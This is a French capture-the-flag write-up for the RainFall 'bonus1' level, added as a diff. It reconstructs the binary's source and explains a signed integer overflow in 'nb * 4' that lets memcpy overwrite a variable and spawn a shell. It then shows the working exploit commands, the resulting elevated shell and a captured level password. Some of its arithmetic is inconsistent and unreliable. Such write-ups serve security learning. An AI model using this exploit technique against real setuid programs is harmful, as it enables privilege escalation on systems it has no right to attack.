@@ -1,0 +1,67 @@
+Connextion au bonus1 -> Bit NX desactive
+Chech du home et des permissions du binaire -> Bit SUID bonus2
+Exection du binaire -> Segmentation fault
+
+Reconstitution du code source
+
+Exploit assez simple et original sur l'overflow d'un entier signe
+
+"""
+int main(int argc, char **argv)
+{
+	int	nb;
+	char area[40];
+
+	nb = atoi(argv[1]);
+	if (nb < 9)
+	{
+		memcpy(area, argv[2], nb * 4);
+		if (nb == 1464814662 (0x574f4c46))
+			execl("/bin/sh", sh, 0);
+	}
+}
+"""
+
+Pour rentrer dans le if qui executera le shell il faut que la variable 'nb' soit egal a une certaine valeur cependant un if precedant nous empeche d'avoir une valeur superieure a 9
+
+Entre ces 2 if apparait un 'memcpy' qui va ecrire les 'nb * 4' octets du 2eme argument 40 octets avant la variable 'nb'.
+
+(0 < nb < 9) * 4 -> valeur max = 32 octets. Nous ne pouvons pas atteindre la variable nb de cette maniere (44 octets necessaire pour l'ecraser)
+
+Mais en utilisant un nombre negatif suffisament grand nous pouvons passe dans un premier temps le premier if mais aussi ecrire un nombre positif d'octets a l'aide du memcpy grace a un overflow int puisque 'nb * 4'
+
+Nous souhaitons que l'overflow ressemble a ceci :
+
+avant nb  |		nb	
+		x | 0000 002c	(hex)
+
+--
+Si x = 1
+
+valeur hex = 1 0000 002c
+1 0000 002c dec -> 4294967340
+4294967336 / 4 = 1073741835
+
+-1073741835 * 4 int -> -44 
+donc non fonctionnel
+--
+Si x = 2
+
+valeur hex = 2 0000 002c
+2 0000 002c dec -> 8589934632
+8589934632 / 4 =2147483659
+
+-2147483658 * 4 int -> 44
+
+
+
+
+bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
+$ id
+uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
+
+bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
+$ pwd
+/home/user/bonus1
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
